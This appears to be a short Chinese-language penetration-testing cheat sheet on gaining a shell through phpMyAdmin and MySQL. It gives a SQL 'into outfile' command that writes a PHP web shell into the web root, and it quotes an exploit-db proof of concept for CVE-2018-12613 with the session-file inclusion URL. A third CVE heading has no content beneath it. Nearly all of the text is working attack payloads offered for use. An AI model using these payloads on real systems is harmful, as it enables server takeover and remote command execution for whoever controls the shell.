# 高权限直接写shell
```
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/getshell.php";
```
需要满足的条件
- 网站的绝对路径。
- 拥有可写权限
- 是union注入(如果是注入的话)


# CVE-2018-12613 本地文件包含Version: 4.8.0, 4.8.1
https://www.exploit-db.com/exploits/40185
```
# Exploit Title: phpMyAdmin 4.8.1 - Local File Inclusion to Remote Code Execution
# Date: 2018-06-21
# Exploit Author: VulnSpy
# Vendor Homepage: http://www.phpmyadmin.net
# Software Link: https://github.com/phpmyadmin/phpmyadmin/archive/RELEASE_4_8_1.tar.gz
# Version: 4.8.0, 4.8.1
# Tested on: php7 mysql5
# CVE : CVE-2018-12613

1. Run SQL Query : select '<?php phpinfo();exit;?>'
2. Include the session file :
http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k
```


# CVE-2018-19968 远程代码执行文件包含

